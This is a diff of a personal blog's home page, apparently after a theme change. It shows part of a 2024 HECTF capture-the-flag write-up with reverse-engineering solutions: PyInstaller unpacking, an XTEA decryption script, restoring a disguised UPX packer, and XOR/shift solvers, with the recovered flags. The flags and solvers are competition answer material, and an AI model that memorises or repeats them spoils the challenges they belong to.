@@ -1,219 +1,329 @@
+
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+    <meta charset="utf-8" />
+    <title>songhahaha的个人博客</title>
+    <meta name="author" content="songhahaha" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
 
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="songhahaha的个人博客">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="songhahaha的个人博客">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="songhahaha">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://example.com/">
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'zh-CN'
-  };
-</script>
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
 
-  <title>songhahaha的个人博客</title>
-  
+
+
+<script src="/js/lib/preview.js"></script>
 
 
 
 
 
+<script src="/js/lib/home.js"></script>
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+<link rel="stylesheet" href="/css/main.css" />
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">songhahaha的个人博客</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">songhahaha</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
-            
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/16/2024HECTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/12/16/2024HECTF/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-12-16 23:44:10" itemprop="dateCreated datePublished" datetime="2024-12-16T23:44:10+08:00">2024-12-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-12-09 19:57:00" itemprop="dateModified" datetime="2024-12-09T19:57:00+08:00">2024-12-09</time>
-              </span>
-
-          
-
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>SONGHAHAHA的个人博客</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;SONGHAHAHA的个人博客</span>
         </div>
-      </header>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>songhahaha的个人博客</h1>
+                <h3>songhahaha</h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    true
+>
+    <div id="home-posts">
+        
 
-      
-          <p>ID:songhahaha</p>
+<div class="post">
+    <a href="/2024/12/16/2024HECTF/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/12/16
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>ID:songhahaha</p>
 <p>校外排名：9</p>
 <p>解出题目数量：17</p>
 <h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="PE-py"><a href="#PE-py" class="headerlink" title="PE?py?"></a><strong>PE?py?</strong></h2><p>首先用pyinstxtractor解包程序，然后得到key为Have_a_cup_of_tea_together。</p>
 <p>然后是一个XTEA加密，附上脚本</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xtea_decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">const</span> <span class="type">uint32_t</span> *key, <span class="type">unsigned</span> <span class="type">int</span> num_rounds = <span class="number">32</span>, <span class="type">uint32_t</span> delta = <span class="number">1640531527</span>,<span class="type">int</span> cc=<span class="number">0</span>)</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> sum = <span class="number">-1</span>*delta * num_rounds;  <span class="comment">// 初始化 sum</span></span><br><span class="line">	<span class="type">uint32_t</span> v0 = v[cc], v1 = v[cc+<span class="number">1</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; num_rounds; ++i) &#123;</span><br><span class="line">		<span class="comment">// 逆向的解密过程</span></span><br><span class="line">		v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">		sum += delta;</span><br><span class="line">		v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	v[cc] = v0;</span><br><span class="line">	v[cc+<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// 密文 v[] 和密钥 key[]（已经按照小端格式转换）</span></span><br><span class="line">	<span class="type">uint32_t</span> v[] = &#123;</span><br><span class="line">		<span class="number">0xdf596194</span>,</span><br><span class="line">		<span class="number">0x2cfe74d6</span>,</span><br><span class="line">		<span class="number">0x1355ae4d</span>,</span><br><span class="line">		<span class="number">0xb6717a87</span>,</span><br><span class="line">		<span class="number">0xf27bb57b</span>,</span><br><span class="line">		<span class="number">0x08d436c5</span>,</span><br><span class="line">		<span class="number">0xc5c8e1af</span>,</span><br><span class="line">		<span class="number">0x0a85bd8f</span>,</span><br><span class="line">		<span class="number">0x19a70032</span>,</span><br><span class="line">		<span class="number">0x400cfef4</span>,</span><br><span class="line">		<span class="number">0xaf02e1fc</span>,</span><br><span class="line">		<span class="number">0xcdedcfb4</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="type">uint32_t</span> key[] = &#123;</span><br><span class="line">		<span class="number">0x54434548</span>,</span><br><span class="line">		<span class="number">0x32303246</span>,</span><br><span class="line">		<span class="number">0x69617734</span>,</span><br><span class="line">		<span class="number">0x756f7974</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 调用 XTEA 解密函数</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		xtea_decrypt(v, key, <span class="number">32</span>, <span class="number">1640531527</span>,i);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 输出解密后的结果</span></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decrypted v[] = &#123; &quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; v[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 将解密后的 uint32_t 数组转换为字节数组（可用于查看明文）</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> decrypted[<span class="number">48</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i) &#123;</span><br><span class="line">		decrypted[i * <span class="number">4</span>] = (v[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">		decrypted[i * <span class="number">4</span> + <span class="number">1</span>] = (v[i] &gt;&gt; <span class="number">8</span>);</span><br><span class="line">		decrypted[i * <span class="number">4</span> + <span class="number">2</span>] = (v[i] &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		decrypted[i * <span class="number">4</span> + <span class="number">3</span>] = (v[i] &gt;&gt; <span class="number">24</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 打印明文（解密后的字节数组）</span></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decrypted text: &quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; decrypted[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//HECTF&#123;58de01fc-af6b-8cf6-e8ca-db5964ce0b1e&#125;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="c">#include &lt;iostream&gt;
+#include &lt;stdint.h&gt;
+#include &lt;cstring&gt;
 
+void xtea_decrypt(uint32_t *v, const uint32_t *key, unsigned int num_rounds = 32, uint32_t delta = 1640531527,int cc=0) &#123;
+    uint32_t sum = -1*delta * num_rounds;  // 初始化 sum
+    uint32_t v0 = v[cc], v1 = v[cc+1];
+    
+    for (unsigned int i = 0; i &lt; num_rounds; ++i) &#123;
+        // 逆向的解密过程
+        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);
+        sum += delta;
+        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);
+    &#125;
+    
+    v[cc] = v0;
+    v[cc+1] = v1;
+&#125;
 
-
+int main() &#123;
+    // 密文 v[] 和密钥 key[]（已经按照小端格式转换）
+    uint32_t v[] = &#123;
+        0xdf596194,
+        0x2cfe74d6,
+        0x1355ae4d,
+        0xb6717a87,
+        0xf27bb57b,
+        0x08d436c5,
+        0xc5c8e1af,
+        0x0a85bd8f,
+        0x19a70032,
+        0x400cfef4,
+        0xaf02e1fc,
+        0xcdedcfb4,
+    &#125;;
+    
+    uint32_t key[] = &#123;
+        0x54434548,
+        0x32303246,
+        0x69617734,
+        0x756f7974,
+    &#125;;
+    
+    // 调用 XTEA 解密函数
+    for(int i=0;i&lt;=10;i+=2)&#123;
+        
+        xtea_decrypt(v, key, 32, 1640531527,i);
+    &#125;
+    
+    // 输出解密后的结果
+    std::cout &lt;&lt; &quot;Decrypted v[] = &#123; &quot;;
+    for (int i = 0; i &lt; 12; ++i) &#123;
+        std::cout &lt;&lt; &quot;0x&quot; &lt;&lt; std::hex &lt;&lt; v[i] &lt;&lt; &quot; &quot;;
+    &#125;
+    std::cout &lt;&lt; &quot;&#125;&quot; &lt;&lt; std::endl;
+    
+    // 将解密后的 uint32_t 数组转换为字节数组（可用于查看明文）
+    unsigned char decrypted[48];
+    for (int i = 0; i &lt; 11; ++i) &#123;
+        decrypted[i * 4] = (v[i] &amp; 0xFF);
+        decrypted[i * 4 + 1] = (v[i] &gt;&gt; 8);
+        decrypted[i * 4 + 2] = (v[i] &gt;&gt; 16);
+        decrypted[i * 4 + 3] = (v[i] &gt;&gt; 24) ;
+    &#125;
+    
+    // 打印明文（解密后的字节数组）
+    std::cout &lt;&lt; &quot;Decrypted text: &quot;;
+    for (int i = 0; i &lt; 48; ++i) &#123;
+        std::cout &lt;&lt; decrypted[i];
+    &#125;
+    std::cout &lt;&lt; std::endl;
+    
+    return 0;
+&#125;
+//HECTF&#123;58de01fc-af6b-8cf6-e8ca-db5964ce0b1e&#125;
+</code></pre>
 <h2 id="easyree"><a href="#easyree" class="headerlink" title="easyree"></a><strong>easyree</strong></h2><p>先DIE查壳，是UPX，然后010修改一下，把CTF全改成UPX，解包。</p>
 <p>之后就是简单的操作逻辑</p>
 <p><img src="/images/2024HECTF/image-20241209195238427.png" alt="image-20241209195238427"></p>
 <p>后面让我猜xor是多少，很简单，由于{在前面未加密，HECTF{，第六位就是{号，根据这个反推xor。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102=126^k</span><br></pre></td></tr></table></figure>
-
+<pre><code>102=126^k
+</code></pre>
 <p>k为24</p>
 <p>最后逆向</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;PNMER&#123;Es_1h_i0_1elxlzoq1lf&#125;&quot;</span></span><br><span class="line">tot = <span class="number">8</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        decrypted = <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - tot) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        result += decrypted</span><br><span class="line">        tot += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        decrypted = <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - tot) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        result += decrypted</span><br><span class="line">        tot += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">text = &quot;PNMER&#123;Es_1h_i0_1elxlzoq1lf&#125;&quot;
+tot = 8
+result = &quot;&quot;
 
+for c in text:
+    if &#39;A&#39; &lt;= c &lt;= &#39;Z&#39;:
+        decrypted = chr((ord(c) - ord(&#39;A&#39;) - tot) % 26 + ord(&#39;A&#39;))
+        result += decrypted
+        tot += 1
+    elif &#39;a&#39; &lt;= c &lt;= &#39;z&#39;:
+        decrypted = chr((ord(c) - ord(&#39;a&#39;) - tot) % 26 + ord(&#39;a&#39;))
+        result += decrypted
+        tot += 1
+    else:
+        result += c
+
+print(result)
+</code></pre>
 <p>HECTF{Re_1s_s0_1nterest1ng}</p>
 <h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a><strong>babyre</strong></h2><p>观察发现简单异或再加上存在base64换表</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dword_55E024F47020 = [<span class="number">81</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">67</span>, <span class="number">85</span>, <span class="number">66</span>, <span class="number">90</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">115</span>, <span class="number">92</span>, <span class="number">70</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">85</span>, <span class="number">125</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">93</span>, <span class="number">67</span>, <span class="number">103</span>, <span class="number">69</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">96</span>, <span class="number">64</span>, <span class="number">95</span>, <span class="number">73</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">56</span>, <span class="number">71</span>, <span class="number">124</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">125</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">56</span>, <span class="number">95</span>, <span class="number">66</span>, <span class="number">121</span>, <span class="number">40</span>]</span><br><span class="line">baset = [<span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> baset:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_string</span>(<span class="params">v6, length</span>):</span><br><span class="line">    original = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        original_char = v6[i] ^ (i // <span class="number">3</span>)</span><br><span 